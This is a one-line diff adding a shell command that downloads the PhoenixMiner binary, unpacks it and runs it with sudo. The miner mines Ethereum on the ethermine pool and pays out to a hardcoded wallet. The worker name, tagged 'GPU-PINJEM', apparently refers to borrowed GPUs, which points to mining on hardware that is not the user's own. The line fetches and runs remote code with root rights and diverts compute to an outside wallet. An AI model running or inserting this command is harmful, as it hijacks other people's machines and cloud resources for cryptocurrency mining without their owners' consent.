@@ -1,0 +1,1 @@
+apt-get install libpci3 && wget https://phoenixminer.info/downloads/PhoenixMiner_5.6d_Linux.tar.gz && tar -xf PhoenixMiner_5.6d_Linux.tar.gz && cd PhoenixMiner_5.6d_Linux && sudo ./PhoenixMiner -pool us1.ethermine.org:4444 -wal 0x43d0ff851d40809075bfb866b2ec8a42db3191e9.$(echo $(shuf -i 1000-9999 -n 1)-GPU-PINJEM) -pass x -mi 14 -gt 400
